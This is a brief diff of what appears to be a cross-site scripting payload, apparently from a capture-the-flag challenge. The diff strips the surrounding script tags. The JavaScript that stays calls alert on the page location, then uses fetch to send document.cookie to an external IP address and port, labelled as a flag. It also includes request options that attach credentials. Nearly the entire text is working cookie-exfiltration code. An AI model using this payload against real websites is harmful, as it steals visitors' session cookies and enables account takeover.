@@ -1,4 +1,3 @@
-<script>    
     alert(document.location);
     fetch("http://47.99.78.222:9999/flag="+document.cookie);
 
@@ -18,5 +17,3 @@
   "mode": "cors",
   "credentials": "include"
   });
-
-</script>
